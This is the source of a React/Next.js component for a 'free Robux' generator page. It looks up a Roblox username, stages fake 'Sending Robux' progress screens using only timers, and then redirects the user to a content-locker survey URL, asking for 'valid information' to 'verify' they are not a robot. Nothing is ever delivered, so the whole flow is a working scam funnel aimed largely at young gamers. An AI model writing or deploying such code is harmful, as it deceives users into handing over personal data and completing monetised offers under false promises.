"use client";

import { useState, useEffect } from "react";
import { useRouter } from "next/navigation";
import Box3 from "./Box3";
import robuxPackages from "../../robuxPackages.json";
import additionalPackages from "../../additionalPackages.json";
import fetchRobloxUser from "../actions/getRobloxUser";
import Confirmation from "./Confirmation";

const RobuxBox = () => {
  const [username, setUsername] = useState("");
  const [userNotFound, setUserNotFound] = useState(false);
  const [currentStep, setCurrentStep] = useState<
    "input" | "loading" | "box3" | "final" | "confirmation"
  >("input");
  const [user, setUser] = useState(null);
  const [userOutput, setUserOutput] = useState<string>("");
  const router = useRouter();

  const handleGetRobuxClick = async () => {
    if (username.length <= 2) {
      alert("Please enter a valid username");
      return;
    }

    setCurrentStep("loading");
    setUserOutput(`Searching for ${username}...`);
    setUserNotFound(false);

    try {
      const fetchedUser = await fetchRobloxUser(username);
      if (fetchedUser) {
        setUser(fetchedUser);
        setUserNotFound(false);
        setTimeout(() => {
          setCurrentStep("confirmation");
        }, 2500);
      } else {
        setUserNotFound(true);
        setTimeout(() => {
          setCurrentStep("input");
        }, 2500);
      }
    } catch (error) {
      console.error("Error fetching user:", error);
      setUserOutput("An error occurred. Please try again later.");
      setTimeout(() => {
        setCurrentStep("input");
      }, 2500);
    }
  };

  const handleRobuxClick = () => {
    setCurrentStep("loading");
    setUserOutput(`Sending Robux to ${username}...`);
    setTimeout(() => {
      setCurrentStep("final");
    }, 2500);
  };

  const handleConfirm = () => {
    if (user) {
      sessionStorage.setItem("robloxUser", JSON.stringify(user));
      router.refresh();
    }

    setCurrentStep("box3");
  };

  const handleCancel = () => {
    sessionStorage.removeItem("robloxUser");
    router.refresh();
    setCurrentStep("input");
    setUsername("");
    setUser(null);
    setUserOutput("");
    setUserNotFound(false);
  };

  useEffect(() => {
    if (sessionStorage.getItem("robloxUser") && currentStep === "input") {
      setCurrentStep("box3");
    }
  }, [currentStep]);

  return (
    <div className="box_con">
      {currentStep === "input" && (
        <div className="flex flex-col justify-center">
          <h3>Roblox Username</h3>
          <div className="flex items-center gap-4">
            <input
              type="text"
              className="input-username"
              placeholder="Enter username"
              value={username}
              onChange={(e) => setUsername(e.target.value)}
            />
            <button onClick={handleGetRobuxClick}>Get Robux</button>
            {userNotFound && (
              <div className="text-rose-600">
                User not found. Please check the username and try again.
              </div>
            )}
          </div>
        </div>
      )}

      {currentStep === "loading" && (
        <div className="box2">
          <div className="folding">
            <div className="sk-cube sk-cube1"></div>
            <div className="sk-cube sk-cube2"></div>
            <div className="sk-cube sk-cube3"></div>
            <div className="sk-cube sk-cube4"></div>
            <div className="square"></div>
          </div>
          <p className="useroutput">{userOutput}</p>
        </div>
      )}

      {currentStep === "confirmation" && (
        <Confirmation
          user={user}
          onConfirm={handleConfirm}
          onCancel={handleCancel}
        />
      )}

      {currentStep === "box3" && (
        <Box3
          additionalPackages={additionalPackages}
          robuxPackages={robuxPackages}
          bonusItem={{
            name: "Sinister G.",
            image: "/images/pumpkin-animation.gif",
            description:
              "One bonus item per account. Refunds result in losing the item.",
            limitedTime: true,
          }}
          handleRobuxClick={handleRobuxClick}
        />
      )}

      {currentStep === "final" && (
        <div className="box4">
          <h3>Final Step!</h3>
          <p>
            Please verify that you are not a robot by answering a few questions
            to receive your Robux! Please enter valid information for the Robux
            to go through. Take your time, as completing it will grant you bonus
            Robux as a reward!
          </p>
          <button
            onClick={() =>
              router.push("https://content-unlock.com/getfreebux~623910D")
            }
            style={{ fontSize: "19px" }}
          >
            Verify
          </button>
        </div>
      )}
    </div>
  );
};

export default RobuxBox;
